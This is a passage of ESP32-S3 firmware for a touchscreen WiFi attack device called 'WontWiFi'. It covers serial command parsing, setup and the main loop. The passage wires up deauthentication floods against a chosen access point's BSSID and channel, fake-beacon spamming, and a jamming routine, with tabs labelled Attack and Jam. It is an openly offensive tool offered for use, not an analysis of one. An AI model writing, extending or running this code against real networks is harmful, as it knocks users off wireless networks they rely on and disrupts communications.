  else if (c == "AUTO_OFF") { Serial.println("{\"type\":\"status\",\"msg\":\"auto_off\"}"); }
  else if (c.startsWith("DEAUTH_START ")) {
    String args = cmd.substring(13); args.trim();
    int sp1 = args.indexOf(' ');
    if (sp1 < 0) { Serial.println("{\"type\":\"error\",\"msg\":\"usage: DEAUTH_START <bssid> <ch> [count]\"}"); return; }
    String bssid = args.substring(0, sp1);
    String rest  = args.substring(sp1 + 1); rest.trim();
    int sp2 = rest.indexOf(' ');
    uint8_t ch = 1; int count = 0;
    if (sp2 < 0) { ch = (uint8_t)rest.toInt(); }
    else { ch = (uint8_t)rest.substring(0, sp2).toInt(); count = rest.substring(sp2+1).toInt(); }
    startDeauthSerial(bssid, ch, count);
  }
  else if (c == "DEAUTH_STOP") {
    stopDeauth();
    Serial.printf("{\"type\":\"status\",\"status\":\"deauth_off\",\"sent\":%lu}\n", deauthSent);
  }
  else if (c.startsWith("BEACON_START")) {
    String args = cmd.substring(12); args.trim();
    if (args.length() > 0) {
      int s1 = args.indexOf(' ');
      if (s1 < 0) { beaconPrefix = args.c_str(); }
      else {
        beaconPrefix = args.substring(0, s1).c_str();
        String rest = args.substring(s1+1); rest.trim();
        int s2 = rest.indexOf(' ');
        if (s2 < 0) { beaconCnt = (uint8_t)rest.toInt(); }
        else {
          beaconCnt = (uint8_t)rest.substring(0, s2).toInt();
          beaconCh  = (uint8_t)rest.substring(s2+1).toInt();
        }
      }
    }
    startBeacon();
    Serial.printf("{\"type\":\"status\",\"status\":\"beacon_on\",\"prefix\":\"%s\",\"count\":%d,\"channel\":%d}\n",
                  beaconPrefix, beaconCnt, beaconCh);
  }
  else if (c == "BEACON_STOP") {
    stopBeacon();
    Serial.println("{\"type\":\"status\",\"status\":\"beacon_off\"}");
  }
  else if (c == "INFO") {
    Serial.printf("{\"type\":\"info\",\"fw\":\"1.1.0-tft\",\"chip\":\"ESP32-S3\",\"heap\":%d}\n",
                  ESP.getFreeHeap());
  }
}

void processSerial() {
  while (Serial.available()) {
    char ch = (char)Serial.read();
    if (ch == '\n' || ch == '\r') {
      if (cmdBuffer.length() > 0) { handleCommand(cmdBuffer); cmdBuffer = ""; }
    } else { cmdBuffer += ch; }
  }
}

// ================================================================
//  DRAW DISPATCH
// ================================================================
void drawCurrentTab() {
  switch (activeTab) {
    case TAB_SCAN:   drawScanTab();  break;
    case TAB_ATTACK: drawAttackTab(); break;
    case TAB_JAM:    drawJamTab();   break;
    case TAB_INFO:   drawInfoTab();  break;
  }
  drawTabBar();
  needsRedraw = false;
}

// ================================================================
//  SETUP
// ================================================================
void setup() {
  Serial.begin(115200);

  // NeoPixel init — white flash on boot
  FastLED.addLeds<WS2812B, PIN_NEOPIXEL, GRB>(leds, NUM_LEDS);
  FastLED.setBrightness(40);
  leds[0] = CRGB::White; FastLED.show();

  // Backlight on
  if (PIN_TFT_BL >= 0) { pinMode(PIN_TFT_BL, OUTPUT); digitalWrite(PIN_TFT_BL, HIGH); }

  // TFT init
  tft.init();
  tft.setRotation(0);   // 0 = portrait, USB at top; 2 = portrait, USB at bottom
  tft.fillScreen(C_BG);

  // Capacitive touch I2C
  Wire.begin(PIN_TOUCH_SDA, PIN_TOUCH_SCL);
  Wire.setClock(400000);
  if (PIN_TOUCH_RST >= 0) {
    pinMode(PIN_TOUCH_RST, OUTPUT);
    digitalWrite(PIN_TOUCH_RST, LOW); delay(10);
    digitalWrite(PIN_TOUCH_RST, HIGH); delay(50);
  }
  if (PIN_TOUCH_INT >= 0) {
    pinMode(PIN_TOUCH_INT, INPUT_PULLUP);
  }

  // WiFi
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  // Splash
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(C_TEXT, C_BG);
  tft.drawString("WontWiFi", SCR_W / 2, SCR_H / 2 - 22, 6);
  tft.setTextColor(0x07FF, C_BG);
  tft.drawString("TFT Edition", SCR_W / 2, SCR_H / 2 + 14, 2);
  tft.setTextColor(C_SUBTEXT, C_BG);
  tft.drawString("ESP32-S3  2.8\" ILI9341", SCR_W / 2, SCR_H / 2 + 36, 1);

  leds[0] = CRGB::Green; FastLED.show();
  delay(1800);
  leds[0] = CRGB::Black; FastLED.show();

  Serial.println("{\"type\":\"ready\",\"fw\":\"1.1.0-tft\",\"chip\":\"ESP32-S3\"}");
  needsRedraw = true;
}

// ================================================================
//  LOOP
// ================================================================
void loop() {
  // --- Serial commands (web UI) ---
  processSerial();

  // --- Touch ---
  processTouches();
  if (tapDetected) {
    if (tapY >= SCR_H - TAB_H) {
      // Tab bar tap
      uint8_t t = tapX / (SCR_W / TAB_COUNT);
      if (t < TAB_COUNT && t != activeTab) { activeTab = t; needsRedraw = true; }
    } else {
      switch (activeTab) {
        case TAB_SCAN:   handleScanTap(tapX, tapY);   break;
        case TAB_ATTACK: handleAttackTap(tapX, tapY); break;
        case TAB_JAM:    handleJamTap(tapX, tapY);    break;
      }
    }
  }

  // --- Redraw ---
  if (needsRedraw) drawCurrentTab();

  // --- Deauth burst ---
  if (deauthOn) {
    uint32_t now = millis();
    if (now - lastDeauthMs >= 5) {
      lastDeauthMs = now;
      sendDeauthFrame();
      // Refresh sent count on screen periodically
      if (deauthSent % 100 == 0) needsRedraw = true;
    }
  }

  // --- Beacon burst ---
  if (beaconOn) {
    uint32_t now = millis();
    if (now - lastBeaconMs >= 100) {
      lastBeaconMs = now;
      sendBeaconBurst();
    }
  }

  // --- Jammer ---
  if (jamOn) {
    doJamBurst();
    delayMicroseconds(500);  // brief yield so touch still processes
  }
}
